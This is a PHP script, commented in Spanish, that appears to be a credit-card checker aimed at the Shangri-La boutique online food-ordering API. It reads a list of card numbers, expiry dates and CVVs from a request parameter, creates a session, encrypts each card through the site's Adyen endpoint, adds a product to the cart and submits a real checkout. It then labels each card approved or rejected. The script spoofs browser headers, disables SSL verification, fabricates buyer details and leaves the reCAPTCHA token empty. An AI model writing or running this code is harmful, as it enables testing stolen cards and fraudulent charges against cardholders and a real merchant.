<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN EXACTA DEL HTML
// ==============================
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$payment_method = "adyen";
$hotel_code = "ISL";
$is_food_site = "1";
$order_type = "express";

// ==============================
// FUNCIÓN DE REQUEST REAL
// ==============================

function makeRequest($url, $data, $headers = [], $method = 'POST') {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip",
        "Connection: keep-alive",
        "X-Requested-With: XMLHttpRequest"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ];
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = json_encode($data);
    }
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error)
    ];
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ No se recibió lista...'
    ]);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ]);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validación básica
if (strlen($cc) < 15 || strlen($cc) > 16) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Número de tarjeta inválido'
    ]);
    exit();
}

if ($mes < 1 || $mes > 12) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Mes inválido'
    ]);
    exit();
}

if (strlen($ano) == 2) $ano = "20" . $ano;

// Tipo de tarjeta
$first_digit = substr($cc, 0, 1);
$cardType = "UNKNOWN";
if ($first_digit == '4') $cardType = "VISA";
if ($first_digit == '5') $cardType = "MASTERCARD";

$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);

// ==============================
// FLUJO REAL - CHECKOUT COMPLETO
// ==============================

try {
    // PASO 1: OBTENER TOKEN DE SESIÓN (REAL)
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error en site_login.php: HTTP " . $site_result['http_code']);
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response || !isset($site_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token de sesión. Respuesta: " . $site_result['response']);
    }
    
    $site_login_token = $site_response['site_login_token'];
    
    // PASO 2: ENCRIPTAR DATOS CON ADYEN (REAL)
    $adyen_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => "",
        "order_token" => "",
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => "",
        "adyen_version" => "_0_1_25"
    ];
    
    $adyen_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_data);
    $encryptedData = [];
    
    if ($adyen_result['success']) {
        $adyen_response = json_decode($adyen_result['response'], true);
        if ($adyen_response && isset($adyen_response['encryptedCardNumber'])) {
            $encryptedData = [
                'encryptedCardNumber' => $adyen_response['encryptedCardNumber'],
                'encryptedExpiryMonth' => $adyen_response['encryptedExpiryMonth'],
                'encryptedExpiryYear' => $adyen_response['encryptedExpiryYear'],
                'encryptedSecurityCode' => $adyen_response['encryptedSecurityCode']
            ];
        }
    }
    
    // PASO 3: OBTENER PRODUCTOS PARA EL CARRITO (REAL)
    $product_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "site_login_token" => $site_login_token,
        "lang" => $api_locale,
        "is_food" => 1,
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00",
        "hotel" => $hotel_code,
        "outlet_name" => "",
        "food_category_name" => ""
    ];
    
    $product_result = makeRequest($api_endpoint . "/product_get.php", $product_data);
    
    // PASO 4: AGREGAR PRODUCTO AL CARRITO (REAL)
    $cart_added = false;
    $cart_id = null;
    
    if ($product_result['success']) {
        $product_response = json_decode($product_result['response'], true);
        if ($product_response && isset($product_response['products']) && count($product_response['products']) > 0) {
            $first_product = $product_response['products'][0];
            
            $cart_add_data = [
                "client_id" => $client_id,
                "promotion_id" => $promotion_id,
                "site_login_token" => $site_login_token,
                "lang" => $api_locale,
                "cart_id" => "",
                "product_id" => $first_product['id'],
                "quantity" => 1,
                "additional_information" => "",
                "food_option_groups" => [],
                "clear_cart" => false,
                "order_type" => $order_type
            ];
            
            $cart_add_result = makeRequest($api_endpoint . "/cart_add_product.php", $cart_add_data);
            
            if ($cart_add_result['success']) {
                $cart_add_response = json_decode($cart_add_result['response'], true);
                if ($cart_add_response && $cart_add_response['status'] == 'success') {
                    $cart_added = true;
                }
            }
        }
    }
    
    // PASO 5: CHECKOUT REAL CON CARGO
    $checkout_data = [
        // Datos básicos requeridos
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        
        // Información de pago REAL
        "payment_method" => $payment_method,
        "card_type" => $cardType,
        "card_issuer" => $cardType,
        
        // Datos de tarjeta REALES
        "card_number" => $cc,
        "card_expiry_month" => $mes,
        "card_expiry_year" => $ano,
        "card_cvv" => $cvv,
        
        // Datos del usuario (requeridos para checkout)
        "first_name" => "Customer",
        "last_name" => "Test",
        "email" => "customer.test" . rand(1000, 9999) . "@email.com",
        "phone" => "+852" . rand(50000000, 99999999),
        
        // Configuración de envío
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d", strtotime("+1 day")),
        "shipping_time" => "12:00 - 13:00",
        
        // Configuraciones varias (igual que el HTML)
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "Hotel Address",
        "order_remark" => "",
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        "country_id" => "",
        "region" => "1",
        "district_group" => "1",
        "district" => "1",
        "pickup_store" => "",
        
        // Dirección de envío (misma que facturación)
        "first_name2" => "Customer",
        "last_name2" => "Test",
        "email2" => "customer.test" . rand(1000, 9999) . "@email.com",
        "phone2" => "+852" . rand(50000000, 99999999),
        "address2" => "Hotel Address",
        "region2" => "1",
        "district_group2" => "1",
        "district2" => "1",
        "country_id2" => "",
        "country2" => "",
        "postal_code2" => "",
        
        // Flags del sistema (EXACTAMENTE como el HTML)
        "is_food_site" => $is_food_site,
        "order_type" => $order_type,
        
        // reCAPTCHA - AQUÍ ESTÁ EL DETALLE IMPORTANTE
        // El HTML muestra que usa reCAPTCHA v3
        "recaptcha_type" => "v3",
        "recaptcha_token" => "" // Este campo es CRÍTICO
    ];
    
    // Añadir datos encriptados si se obtuvieron
    if (!empty($encryptedData)) {
        $checkout_data = array_merge($checkout_data, $encryptedData);
    }
    
    // PASO 6: EJECUTAR CHECKOUT REAL (CON CARGO)
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en checkout.php: HTTP " . $checkout_result['http_code'] . " - " . $checkout_result['error']);
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    
    if (!$checkout_response) {
        throw new Exception("Respuesta inválida del checkout: " . $checkout_result['response']);
    }
    
    // PROCESAR RESPUESTA REAL DEL CHECKOUT
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            // ÉXITO - Pago aprobado con CARGO REAL
            $resultCode = isset($checkout_response['direct_post']['resultCode']) ? 
                         $checkout_response['direct_post']['resultCode'] : 'Authorised';
            
            if ($resultCode == 'Authorised') {
                $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-success">SHANGRI-LA</span>';
                
                echo json_encode([
                    'status' => 'approved',
                    'message' => 'Pago autorizado',
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'result_code' => $resultCode,
                        'order_number' => isset($checkout_response['display_order_number']) ? 
                                         $checkout_response['display_order_number'] : 'N/A',
                        'amount' => isset($checkout_response['direct_post']['amount']) ? 
                                   $checkout_response['direct_post']['amount'] : 'N/A',
                        'currency' => isset($checkout_response['direct_post']['currency_id']) ? 
                                     $checkout_response['direct_post']['currency_id'] : 'HKD'
                    ]
                ]);
            } else {
                // RECHAZADA - Pero el intento de cargo se hizo
                $refusalReason = isset($checkout_response['direct_post']['refusalReason']) ? 
                               $checkout_response['direct_post']['refusalReason'] : 'Rechazado';
                
                $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . $refusalReason . '</span>';
                
                echo json_encode([
                    'status' => 'rejected',
                    'message' => $refusalReason,
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'reason' => $refusalReason,
                        'result_code' => $resultCode
                    ]
                ]);
            }
        } else {
            // ERROR en el checkout
            $errorMsg = isset($checkout_response['error']) ? $checkout_response['error'] : 'Error desconocido';
            
            $html = '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                   '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                   '<span class="badge badge-warning">' . $errorMsg . '</span>';
            
            echo json_encode([
                'status' => 'error',
                'message' => $errorMsg,
                'html' => $html,
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'reason' => $errorMsg
                ]
            ]);
        }
    } else {
        throw new Exception("Respuesta sin status del servidor: " . json_encode($checkout_response));
    }
    
} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
        'data' => [
            'card' => $cardMasked,
            'expiry' => $expiryMasked
        ]
    ]);
}